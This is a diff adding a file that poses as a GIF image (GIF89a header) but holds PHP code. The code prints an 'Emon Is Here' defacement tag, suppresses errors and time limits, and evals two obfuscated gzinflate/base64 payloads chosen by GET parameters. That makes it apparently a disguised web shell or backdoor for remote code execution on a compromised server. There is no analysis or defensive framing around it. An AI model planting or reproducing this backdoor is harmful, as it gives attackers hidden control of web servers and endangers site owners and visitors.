@@ -1,0 +1,6 @@
+GIF89a?????ÿÿÿ!ù????,???????D?;?<?php
+echo "Emon Is Here";
+@error_reporting(0); @set_time_limit(0); $lol = $_GET['lol']; $osc = $_GET['osc'];
+if (isset($osc)) { eval(gzinflate(base64_decode('pZHNasMwEITvhb6DYgyWIZS2lF5CwA9SEI48ilUcyWhlmhDy7l3J+ekhkENPEjM73w5SqXfdetMSPj9UB+07yNKTrlfPTyUI28mmAexlyWdSoXsvbhYrZnI6Wu9EnjKoj5wNILEWVcW+NUIusBvjYbaTb428xBT2liLJCnvoKrtNuubhZQLlMjPw21sniy9XXI0TVxoI94DUYxjUDXtmNDd9LvSAcqCI3bmY3yiKbYgyhZrZukIufB7aIirtXYRjRJ5lEa5TekDr5IOVY0sU+zDdXXox/722saQ46qeg+dNNQox+hJsfvghF/ffVioLDP70dIBeNgTccqWtxFNl/4bAJaDtWl2+v7x/1SpxSWT14SvS8mpWAOAWXQ0n5BQ=='))); }
+else { eval(gzinflate(base64_decode('pVNdi9swEHw/uP+wEQbFkCZpy0G5xKGhJEdpoAX3nkIwii3XAtsSllwnd+S/V7LsOL409KF+8cfOjGdnV07Ic0VzBR5IVTAhUyITKodO8OO7/3OLmzLeuTNwwpilVCPPRfOOd7pSvqmUTeX+joYJBzzfL+b7YoHHIhFBmZOMDt0xNp/mk/0Cd7iYFxmQUDGeewhBRlXCIw8JLhUCmofqKKiHsjJVTJBCTQz+XUQUQWBUPUQqBCyq75e6ih4UKSixqLZpqY6p5lQsUsnjw6cHcZgllP1K1OOH6VQctMLYabDa7aQVsb104iwXpQJrzWBaL3U+CCR70S/vpwh+k7TUjzmtTMWEga51LDcI9Y+UZltZWe4zpmxrQSnSs9YXC7tlxzqwkpduPk7R4qbv8n98a3OcRP/0/Wxhev5mhLUai89r13Sv1+71/g705SQkj+oVi7mg+dDu4ghwhd2ZhRi6RbUk+xWGcVUwRdvqCNqZuuB5HqyXG3/lwivU3SC9qjbTdt+flk/LjVlTM3U0g1MnTlNJbxP952/+yofBYHDJhjhMuTy7ad2femK4E1tfebDbZ3yc+qHZ6LvQdO1zyMVRI9ZfNyt/i+2x3GKVicDMC+9GzeF1ewnY6bTn+rqRfhRvY+iza+9/J5/+AA=='))); }
+?>
